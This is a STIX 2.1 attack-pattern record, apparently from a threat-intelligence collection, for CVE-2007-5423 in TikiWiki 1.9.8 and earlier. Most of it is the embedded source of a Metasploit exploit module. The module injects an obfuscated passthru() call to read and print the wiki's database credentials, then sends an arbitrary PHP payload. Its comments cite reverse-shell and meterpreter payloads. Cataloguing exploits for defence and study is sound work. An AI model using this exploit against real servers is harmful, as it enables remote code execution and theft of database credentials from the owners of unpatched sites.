{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--96638059-2a13-496a-ba5d-39f027ddc9af",
    "created": "2024-08-14T17:12:34.846748Z",
    "modified": "2024-08-14T17:12:34.846752Z",
    "name": "TikiWiki tiki-graph_formula Remote PHP Code Execution",
    "description": " TikiWiki (<= 1.9.8) contains a flaw that may allow a remote attacker to execute arbitrary PHP code.  The issue is due to 'tiki-graph_formula.php' script not properly sanitizing user input supplied to create_function(), which may allow a remote attacker to execute arbitrary PHP code resulting in a loss of integrity. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/tikiwiki_graph_formula_exec.rb",
            "external_id": "tikiwiki_graph_formula_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5423"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TikiWiki tiki-graph_formula Remote PHP Code Execution',\n      'Description'    => %q{\n          TikiWiki (<= 1.9.8) contains a flaw that may allow a remote\n        attacker to execute arbitrary PHP code.  The issue is due to\n        'tiki-graph_formula.php' script not properly sanitizing user\n        input supplied to create_function(), which may allow a remote\n        attacker to execute arbitrary PHP code resulting in a loss of\n        integrity.\n      },\n      'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>', 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-5423'],\n          ['OSVDB', '40478'],\n          ['BID', '26006'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          # 6k.  Really it's the max length of a URI minus the junk\n          # we have to put in the request to trigger the\n          # vulnerability.  On Apache, 8190 is the max, so this\n          # should be a pretty safe value.\n          'Space'       => 6144,\n          # Yes, 'x' is a badchar.  The vulnerable code replaces it with '$x'.\n          'BadChars'    => \"`\\\"' %&x\",\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2007-10-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"TikiWiki directory path\", \"/tikiwiki\"]),\n      ])\n  end\n\n  def check\n    res = send_request_raw(\n      {\n        'uri'     => normalize_uri(datastore['URI'], \"/tiki-index.php\"),\n        'method'  => 'GET',\n        'headers' =>\n          {\n            'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n            'Connection' => 'Close',\n          }\n      }, 5)\n\n    http_fingerprint({ :response => res })  # check method\n\n    if (res and res.code == 200 and res.body.match(/TikiWiki v?([0-9\\.]*)/))\n      ver = $1\n      #print_status(\"Detected TikiWiki version #{ver}\")\n      ver = ver.split('.')\n      return Exploit::CheckCode::Safe if (ver[0] != '1')\n      return Exploit::CheckCode::Safe if (ver[1] != '9')\n      if (ver.length > 2)\n        ver2 = ver[2].to_i\n        if (ver.length > 3)\n          ver3 = ver[3].to_i\n        else\n          ver3 = 0\n        end\n        return Exploit::CheckCode::Safe if (ver2 > 8)\n        return Exploit::CheckCode::Safe if (ver2 == 8 and ver3 > 0)\n      end\n      return Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    print_status(\"Attempting to obtain database credentials...\")\n    url_db_local = build_uri(\"passthru(\" +\n      \"chr(101).chr(99).chr(104).chr(111).chr(32).chr(89).chr(89).chr(89).\" +  # echo YYY\n      \"chr(59).\" +  # ;\n      # cat db/local.php\n      \"chr(99).chr(97).chr(116).chr(32).chr(100).chr(98).chr(47).chr(108).chr(111).chr(99).chr(97).chr(108).chr(46).chr(112).chr(104).chr(112).\" +\n      \"chr(59).\" +  # ;\n      \"chr(101).chr(99).chr(104).chr(111).chr(32).chr(89).chr(89).chr(89)\" +   # echo YYY\n      \")\")\n    res = send_request_raw({\n      'uri'     => url_db_local,\n      'method'  => 'GET',\n      'headers' =>\n        {\n          'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n          'Connection' => 'Close',\n        }\n      }, 5)\n    if (res and res.message == \"OK\" and res.body)\n      print_status(\"The server returned            : #{res.code} #{res.message}\")\n      print_status(\"Server version                 : #{res.headers['Server']}\")\n\n      db_tiki   = res.body.match(/db_tiki='(.*?)';/m)\n      if (db_tiki)\n        dbversion = res.body.match(/dbversion_tiki='(.*?)';/m)\n        host_tiki = res.body.match(/host_tiki='(.*?)';/m)\n        user_tiki = res.body.match(/user_tiki='(.*?)';/m)\n        pass_tiki = res.body.match(/pass_tiki='(.*?)';/m)\n        dbs_tiki  = res.body.match(/dbs_tiki='(.*?)';/m)\n\n        print_status(\"TikiWiki database informations : \\n\")\n\n        print(\"db_tiki   : \" + db_tiki[1]   + \"\\n\")\n        print(\"dbversion : \" + dbversion[1] + \"\\n\")\n        print(\"host_tiki : \" + host_tiki[1] + \"\\n\")\n        print(\"user_tiki : \" + user_tiki[1] + \"\\n\")\n        print(\"pass_tiki : \" + pass_tiki[1] + \"\\n\")\n        print(\"dbs_tiki  : \" + dbs_tiki[1]  + \"\\n\\n\")\n      end\n    else\n      print_status(\"No response from the server\")\n    end\n\n\n    print_status(\"Attempting to execute our payload...\")\n    command = Rex::Text.uri_encode(payload.encoded)\n    url_cmd = build_uri(payload.encoded)\n    res = send_request_raw({\n      'uri'     => url_cmd,\n      'method'  => 'GET',\n      'headers' =>\n        {\n          'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n          'Connection' => 'Close',\n        }\n      }, 5)\n  end\n\n  #\n  # This function will build a fairly randomish query string to be used\n  # when exploiting this vulnerability :)\n  #\n  def build_uri(f_val)\n    uri = normalize_uri(datastore['URI'], \"/tiki-graph_formula.php?\")\n\n    # Requirements:\n    query = ''\n\n    # 1. w,h,s,min,max must all be numeric\n    vars = %w{ w h s min max }\n    min = nil\n    vars.each { |el|\n      query << \"&\" if query.length > 0\n      num = 1+rand(999)\n      # 2. min must be less than max\n      case el\n      when 's'\n        num = 1+rand(500)\n      when 'min'\n        if (min)\n          num = min\n        else\n          min = num\n        end\n      when 'max'\n        min ||= num\n        num = min + 1 + rand(99)\n      end\n      query << \"#{el}=#{num}\"\n    }\n\n    # 3. cannot use `, ', \", or space\n    if (f_val.index('\\'') or f_val.index('\"') or f_val.index('`') or f_val.index(' '))\n      fail_with(Failure::Unknown, \"The value for the 'f' variable contains an invalid character!\")\n    end\n\n    # 4. the function must be one of:\n    valid = %w{\n      abs acos acosh asin asinh atan2 atan atanh ceil cos cosh deg2rad\n      exp expm1 floor fmod hypot log10 log1p log max min pi pow rad2deg round sin\n      sinh sqrt tan tanh\n    }\n    func = valid[rand(valid.length)]\n\n    # 5. f must be an array\n    query << \"&\" if query.length > 0\n\n    # Strip off the semi-colon that the encoder insists on including.\n    if f_val[-1,1] == \";\"\n      f_val = f_val[0,f_val.length-1]\n    end\n    query << \"f[]=x.#{func}.#{f_val}\"\n\n    # This doesn't seem to be necessary on PHP 5.2.4, tikiwiki 1.9.5\n    # Tested with php/reverse_php, php/meterpreter_reverse_tcp, and\n    # php/meterpreter/reverse_tcp\n    #  -egypt\n    # If we dont kill php here it spins eating 100% cpu :-/\n    #query << '.die()'\n\n    # 6. two options for 't' - png and pdf\n    #    - png requires php's gd extension\n    #    - pdf, if you set 'p', requires php pdf extension\n    #  -- we always use 'pdf' with a null 'p'\n    query << \"&\" if query.length > 0\n    query << 't=pdf'\n\n    # 7. title must be set\n    query << '&title='\n\n    uri << query\n    uri\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-10-10",
    "x_mitre_platforms": [
        "php'"
    ]
}